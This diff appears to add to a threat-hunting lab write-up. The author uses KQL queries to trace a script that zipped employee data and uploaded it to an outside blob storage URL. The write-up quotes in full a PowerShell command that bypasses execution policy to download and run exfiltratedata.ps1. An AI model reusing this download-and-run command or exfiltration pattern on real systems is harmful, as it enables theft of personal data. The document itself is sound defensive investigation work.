@@ -37,7 +37,53 @@ We see on 2025-05-21T04:49:41 GMT a file named "employee-data-20250521044933.zip
 This process was repeated on 5/26 which means we may be seeing a script running that is routinely zipping employee data and moving it to backup folder. 
 ___
 
+___
+
+Looking at the DeviceProcessEvents we will see what activity took place two minutes before and two minutes after 2025-05-21T04:49:41 GMT.
+
+```kql
+let suspectDevice = "zack-bruteforce";
+let suspectedProcessTime = datetime(2025-05-21T04:49:41.1085818Z);
+DeviceProcessEvents
+| where DeviceName == suspectDevice and Timestamp between ((suspectedProcessTime - 2m) .. (suspectedProcessTime + 2m))
+| order by Timestamp asc
+| project Timestamp, ProcessCommandLine
+```
+
+<img width="1422" alt="Screenshot 2 Timeline of processes" src="https://github.com/user-attachments/assets/6d4ba2c9-0b96-42c0-a44c-618d1136503f" />
 
 
+1. A command to initiate powershell and execute a script called script4.ps1. The cmd prompt terminated upon completion (the /C switch) and any script execution policy was bypassed.
+2. Powershell ran script4.ps1 unrestricted.
+3. A new command shell was crated to execute a powershell command that would download a file from GitHub and save it to the Programdata folder. The file is called "exfiltratedata.ps1."
+Full URL: powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
+4. Powershell ran the command bypassing execution policy.
+5. A command to run the downloaded file from powershell.
+6. Powershell ran the command to run the downloaded file.
+7. 7Zip, a common archiving tool, was installed silently (no notification or interaction from the user).
+8. 7Zip executed a command to archive a file called employee-data-20250521044933.csv and safe it to the ProgramData folder as employee-data-20250521044933.zip.
+
+___
+
+The previous KQL query revealed where the malicious script is stored. Viewing the script shows that indeed it was archiving data and event uploading it outside of the network to "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip"
+
+###Screenshot3###
+
+____
+
+Checking DeviceNetworkEvents for activity within 2 minutes before and 2 minutes after the script execution we can check for network activity to that URL.
+
+```kql
+let suspectDevice = "zack-bruteforce";
+let suspectedProcessTime = datetime(2025-05-21T04:49:41.1085818Z);
+DeviceNetworkEvents
+| where DeviceName == suspectDevice and Timestamp between ((suspectedProcessTime - 2m) .. (suspectedProcessTime + 2m))
+```
+
+###Screenshot4###
+
+The device indeed reach out to the URL and according to the script uploaded the archived employee data.
+
+___
 
 
